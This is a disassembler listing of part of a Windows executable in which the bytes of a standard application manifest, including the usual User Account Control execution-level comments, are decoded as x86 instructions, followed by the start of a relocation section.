  40f1b8:	cmp    dh,BYTE PTR [ebx+0x63]
  40f1bb:	push   0x73616d65
  40f1c0:	sub    eax,0x7263696d
  40f1c5:	outs   dx,DWORD PTR ds:[esi]
  40f1c6:	jae    0x40f237
  40f1c8:	data16 je 0x40f1f8
  40f1cb:	arpl   WORD PTR [edi+0x6d],bp
  40f1ce:	cmp    ah,BYTE PTR [ecx+0x73]
  40f1d1:	ins    DWORD PTR es:[edi],dx
  40f1d2:	cs jbe 0x40f208
  40f1d5:	and    bh,BYTE PTR [esi]
  40f1d7:	or     eax,0x2020200a
  40f1dc:	and    BYTE PTR [eax],ah
  40f1de:	and    BYTE PTR [eax],ah
  40f1e0:	and    BYTE PTR [ecx+eiz*1],bh
  40f1e3:	sub    eax,0x4155202d
  40f1e8:	inc    ebx
  40f1e9:	and    BYTE PTR [ebp+0x61],cl
  40f1ec:	outs   dx,BYTE PTR ds:[esi]
  40f1ed:	imul   esp,DWORD PTR [esi+0x65],0x4f207473
  40f1f4:	jo     0x40f26a
  40f1f6:	imul   ebp,DWORD PTR [edi+0x6e],0x200a0d73
  40f1fd:	and    BYTE PTR [eax],ah
  40f1ff:	and    BYTE PTR [eax],ah
  40f201:	and    BYTE PTR [eax],ah
  40f203:	and    BYTE PTR [eax],ah
  40f205:	and    BYTE PTR [eax],ah
  40f207:	and    BYTE PTR [ecx+0x66],cl
  40f20a:	and    BYTE PTR [ecx+0x6f],bh
  40f20d:	jne    0x40f22f
  40f20f:	ja     0x40f272
  40f211:	outs   dx,BYTE PTR ds:[esi]
  40f212:	je     0x40f234
  40f214:	je     0x40f285
  40f216:	and    BYTE PTR [ebx+0x68],ah
  40f219:	popa   
  40f21a:	outs   dx,BYTE PTR ds:[esi]
  40f21b:	and    BYTE PTR gs:[si+0x68],dh
  40f220:	and    BYTE PTR gs:[edi+0x69],dl
  40f224:	outs   dx,BYTE PTR ds:[esi]
  40f225:	outs   dx,DWORD PTR fs:[esi]
  40f227:	ja     0x40f29c
  40f229:	and    BYTE PTR [ebp+0x73],dl
  40f22c:	gs jb  0x40f24f
  40f22f:	inc    ecx
  40f230:	arpl   WORD PTR [ebx+0x6f],sp
  40f233:	jne    0x40f2a3
  40f235:	je     0x40f257
  40f237:	inc    ebx
  40f238:	outs   dx,DWORD PTR ds:[esi]
  40f239:	outs   dx,BYTE PTR ds:[esi]
  40f23a:	je     0x40f2ae
  40f23c:	outs   dx,DWORD PTR ds:[esi]
  40f23d:	ins    BYTE PTR es:[edi],dx
  40f23e:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40f242:	gs ins BYTE PTR es:[edi],dx
  40f244:	and    BYTE PTR [edx+0x65],dh
  40f247:	jo     0x40f2b5
  40f249:	popa   
  40f24a:	arpl   WORD PTR [ebp+0x20],sp
  40f24d:	je     0x40f2b7
  40f24f:	and    BYTE PTR gs:0x2020200a,cl
  40f256:	and    BYTE PTR [eax],ah
  40f258:	and    BYTE PTR [eax],ah
  40f25a:	and    BYTE PTR [eax],ah
  40f25c:	and    BYTE PTR [eax],ah
  40f25e:	and    BYTE PTR [edx+0x65],dh
  40f261:	jno    0x40f2d8
  40f263:	gs jae 0x40f2da
  40f266:	gs fs inc ebp
  40f269:	js     0x40f2d0
  40f26b:	arpl   WORD PTR [ebp+0x74],si
  40f26e:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f275:	ins    BYTE PTR es:[edi],dx
  40f276:	and    BYTE PTR [esi+0x6f],ch
  40f279:	fs and BYTE PTR gs:[edi+0x69],dh
  40f27e:	je     0x40f2e8
  40f280:	and    BYTE PTR [edi+0x6e],ch
  40f283:	and    BYTE PTR gs:[edi+0x66],ch
  40f287:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40f28b:	and    BYTE PTR [esi+0x6f],ah
  40f28e:	ins    BYTE PTR es:[edi],dx
  40f28f:	ins    BYTE PTR es:[edi],dx
  40f290:	outs   dx,DWORD PTR ds:[esi]
  40f291:	ja     0x40f2fc
  40f293:	outs   dx,BYTE PTR ds:[esi]
  40f294:	addr16 cs or eax,0x200a0d0a
  40f29b:	and    BYTE PTR [eax],ah
  40f29d:	and    BYTE PTR [eax],ah
  40f29f:	and    BYTE PTR [eax],ah
  40f2a1:	and    BYTE PTR [edx+esi*2],bh
  40f2a4:	gs jno 0x40f31c
  40f2a7:	gs jae 0x40f31e
  40f2aa:	gs fs inc ebp
  40f2ad:	js     0x40f314
  40f2af:	arpl   WORD PTR [ebp+0x74],si
  40f2b2:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f2b9:	ins    BYTE PTR es:[edi],dx
  40f2ba:	and    BYTE PTR [eax],ah
  40f2bc:	ins    BYTE PTR es:[edi],dx
  40f2bd:	gs jbe 0x40f325
  40f2c0:	ins    BYTE PTR es:[edi],dx
  40f2c1:	cmp    eax,0x49736122
  40f2c6:	outs   dx,BYTE PTR ds:[esi]
  40f2c7:	jbe    0x40f338
  40f2c9:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40f2cd:	and    BYTE PTR [ebp+0x69],dh
  40f2d0:	inc    ecx
  40f2d1:	arpl   WORD PTR [ebx+0x65],sp
  40f2d4:	jae    0x40f349
  40f2d6:	cmp    eax,0x6c616622
  40f2db:	jae    0x40f342
  40f2dd:	and    ah,BYTE PTR [eax]
  40f2df:	das    
  40f2e0:	ds or  eax,0x2020200a
  40f2e6:	and    BYTE PTR [eax],ah
  40f2e8:	and    BYTE PTR [eax],ah
  40f2ea:	and    BYTE PTR [edx+esi*2],bh
  40f2ed:	gs jno 0x40f365
  40f2f0:	gs jae 0x40f367
  40f2f3:	gs fs inc ebp
  40f2f6:	js     0x40f35d
  40f2f8:	arpl   WORD PTR [ebp+0x74],si
  40f2fb:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f302:	ins    BYTE PTR es:[edi],dx
  40f303:	and    BYTE PTR [eax],ah
  40f305:	ins    BYTE PTR es:[edi],dx
  40f306:	gs jbe 0x40f36e
  40f309:	ins    BYTE PTR es:[edi],dx
  40f30a:	cmp    eax,0x71657222
  40f30f:	jne    0x40f37a
  40f311:	jb     0x40f378
  40f313:	inc    ecx
  40f314:	fs ins DWORD PTR es:[edi],dx
  40f316:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40f31d:	je     0x40f38e
  40f31f:	jb     0x40f343
  40f321:	and    BYTE PTR [ebp+0x69],dh
  40f324:	inc    ecx
  40f325:	arpl   WORD PTR [ebx+0x65],sp
  40f328:	jae    0x40f39d
  40f32a:	cmp    eax,0x6c616622
  40f32f:	jae    0x40f396
  40f331:	and    ah,BYTE PTR [eax]
  40f333:	das    
  40f334:	ds or  eax,0x2020200a
  40f33a:	and    BYTE PTR [eax],ah
  40f33c:	and    BYTE PTR [eax],ah
  40f33e:	and    BYTE PTR [edx+esi*2],bh
  40f341:	gs jno 0x40f3b9
  40f344:	gs jae 0x40f3bb
  40f347:	gs fs inc ebp
  40f34a:	js     0x40f3b1
  40f34c:	arpl   WORD PTR [ebp+0x74],si
  40f34f:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f356:	ins    BYTE PTR es:[edi],dx
  40f357:	and    BYTE PTR [eax],ah
  40f359:	ins    BYTE PTR es:[edi],dx
  40f35a:	gs jbe 0x40f3c2
  40f35d:	ins    BYTE PTR es:[edi],dx
  40f35e:	cmp    eax,0x67696822
  40f363:	push   0x41747365
  40f368:	jbe    0x40f3cb
  40f36a:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x2022656c
  40f372:	jne    0x40f3dd
  40f374:	inc    ecx
  40f375:	arpl   WORD PTR [ebx+0x65],sp
  40f378:	jae    0x40f3ed
  40f37a:	cmp    eax,0x6c616622
  40f37f:	jae    0x40f3e6
  40f381:	and    ah,BYTE PTR [eax]
  40f383:	das    
  40f384:	ds or  eax,0x200a0d0a
  40f38a:	and    BYTE PTR [eax],ah
  40f38c:	and    BYTE PTR [eax],ah
  40f38e:	and    BYTE PTR [eax],ah
  40f390:	and    BYTE PTR [eax],ah
  40f392:	and    BYTE PTR [eax],ah
  40f394:	and    BYTE PTR [ecx+0x66],cl
  40f397:	and    BYTE PTR [ecx+0x6f],bh
  40f39a:	jne    0x40f3bc
  40f39c:	ja     0x40f3ff
  40f39e:	outs   dx,BYTE PTR ds:[esi]
  40f39f:	je     0x40f3c1
  40f3a1:	je     0x40f412
  40f3a3:	and    BYTE PTR [ebp+0x74],dh
  40f3a6:	imul   ebp,DWORD PTR [ecx+ebp*2+0x7a],0x69462065
  40f3ae:	ins    BYTE PTR es:[edi],dx
  40f3af:	and    BYTE PTR gs:[ecx+0x6e],ah
  40f3b3:	and    BYTE PTR fs:[edx+0x65],dl
  40f3b7:	imul   esi,DWORD PTR [bp+di+0x74],0x56207972
  40f3bf:	imul   esi,DWORD PTR [edx+0x74],0x696c6175
  40f3c6:	jp     0x40f429
  40f3c8:	je     0x40f433
  40f3ca:	outs   dx,DWORD PTR ds:[esi]
  40f3cb:	outs   dx,BYTE PTR ds:[esi]
  40f3cc:	and    BYTE PTR [esi+0x6f],ah
  40f3cf:	jb     0x40f3f1
  40f3d1:	bound  esp,QWORD PTR [ecx+0x63]
  40f3d4:	imul   esi,DWORD PTR [edi+0x61],0x72
  40f3d8:	and    BYTE PTR fs:0x2020200a,cl
  40f3df:	and    BYTE PTR [eax],ah
  40f3e1:	and    BYTE PTR [eax],ah
  40f3e3:	and    BYTE PTR [eax],ah
  40f3e5:	and    BYTE PTR [eax],ah
  40f3e7:	and    BYTE PTR [ebx+0x6f],ah
  40f3ea:	ins    DWORD PTR es:[edi],dx
  40f3eb:	jo     0x40f44e
  40f3ed:	je     0x40f458
  40f3ef:	bound  ebp,QWORD PTR [ecx+0x6c]
  40f3f2:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6e656874
  40f3fa:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  40f3fe:	gs je  0x40f466
  40f401:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40f405:	and    BYTE PTR [edx+0x65],dh
  40f408:	jno    0x40f47f
  40f40a:	gs jae 0x40f481
  40f40d:	gs fs inc ebp
  40f410:	js     0x40f477
  40f412:	arpl   WORD PTR [ebp+0x74],si
  40f415:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f41c:	ins    BYTE PTR es:[edi],dx
  40f41d:	and    BYTE PTR [esi+0x6f],ch
  40f420:	fs gs cs or eax,0x2020200a
  40f428:	and    BYTE PTR [eax],ah
  40f42a:	and    BYTE PTR [eax],ah
  40f42c:	and    BYTE PTR [edx+esi*2],bh
  40f42f:	gs jno 0x40f4a7
  40f432:	gs jae 0x40f4a9
  40f435:	gs fs inc ebp
  40f438:	js     0x40f49f
  40f43a:	arpl   WORD PTR [ebp+0x74],si
  40f43d:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f444:	ins    BYTE PTR es:[edi],dx
  40f445:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40f449:	gs ins BYTE PTR es:[edi],dx
  40f44b:	cmp    eax,0x71657222
  40f450:	jne    0x40f4bb
  40f452:	jb     0x40f4b9
  40f454:	inc    ecx
  40f455:	fs ins DWORD PTR es:[edi],dx
  40f457:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40f45e:	je     0x40f4cf
  40f460:	jb     0x40f484
  40f462:	and    BYTE PTR [ebp+0x69],dh
  40f465:	inc    ecx
  40f466:	arpl   WORD PTR [ebx+0x65],sp
  40f469:	jae    0x40f4de
  40f46b:	cmp    eax,0x6c616622
  40f470:	jae    0x40f4d7
  40f472:	and    ah,BYTE PTR [eax]
  40f474:	das    
  40f475:	ds or  eax,0x2020200a
  40f47b:	and    BYTE PTR [eax],ah
  40f47d:	and    BYTE PTR [eax],ah
  40f47f:	and    BYTE PTR ds:0xa0d3e2d,ch
  40f485:	and    BYTE PTR [eax],ah
  40f487:	and    BYTE PTR [eax],ah
  40f489:	and    BYTE PTR [eax],ah
  40f48b:	and    BYTE PTR [eax],ah
  40f48d:	cmp    al,0x72
  40f48f:	gs jno 0x40f507
  40f492:	gs jae 0x40f509
  40f495:	gs fs inc ebp
  40f498:	js     0x40f4ff
  40f49a:	arpl   WORD PTR [ebp+0x74],si
  40f49d:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40f4a4:	ins    BYTE PTR es:[edi],dx
  40f4a5:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40f4a9:	gs ins BYTE PTR es:[edi],dx
  40f4ab:	cmp    eax,0x49736122
  40f4b0:	outs   dx,BYTE PTR ds:[esi]
  40f4b1:	jbe    0x40f522
  40f4b3:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40f4b7:	and    BYTE PTR [ebp+0x69],dh
  40f4ba:	inc    ecx
  40f4bb:	arpl   WORD PTR [ebx+0x65],sp
  40f4be:	jae    0x40f533
  40f4c0:	cmp    eax,0x6c616622
  40f4c5:	jae    0x40f52c
  40f4c7:	and    ah,BYTE PTR [eax]
  40f4c9:	das    
  40f4ca:	ds or  eax,0x2020200a
  40f4d0:	and    BYTE PTR [eax],ah
  40f4d2:	and    BYTE PTR [edi+ebp*1],bh
  40f4d5:	jb     0x40f53c
  40f4d7:	jno    0x40f54e
  40f4d9:	gs jae 0x40f550
  40f4dc:	gs fs push eax
  40f4df:	jb     0x40f54a
  40f4e1:	jbe    0x40f54c
  40f4e3:	ins    BYTE PTR es:[edi],dx
  40f4e4:	gs addr16 gs jae 0x40f527
  40f4e9:	or     eax,0x2020200a
  40f4ee:	and    BYTE PTR [edi+ebp*1],bh
  40f4f1:	jae    0x40f558
  40f4f3:	arpl   WORD PTR [ebp+0x72],si
  40f4f6:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40f4fe:	cmp    al,0x2f
  40f500:	je     0x40f574
  40f502:	jne    0x40f577
  40f504:	je     0x40f54f
  40f506:	outs   dx,BYTE PTR ds:[esi]
  40f507:	outs   dx,WORD PTR ds:[esi]
  40f509:	ds or  eax,0x612f3c0a
  40f50f:	jae    0x40f57e
  40f511:	jbe    0x40f544
  40f513:	cmp    ah,BYTE PTR [ecx+0x73]
  40f516:	jae    0x40f57d
  40f518:	ins    DWORD PTR es:[edi],dx
  40f519:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40f51d:	.byte 0xd
  40f51e:	.byte 0xa
  40f51f:	push   eax

Disassembly of section .reloc:

00410000 <.reloc>:
  410000:	add    al,dl
  410002:	add    BYTE PTR [eax],al
  410004:	or     al,0x0
  410006:	add    BYTE PTR [eax],al
  410008:	lock xor al,BYTE PTR [eax]
	...
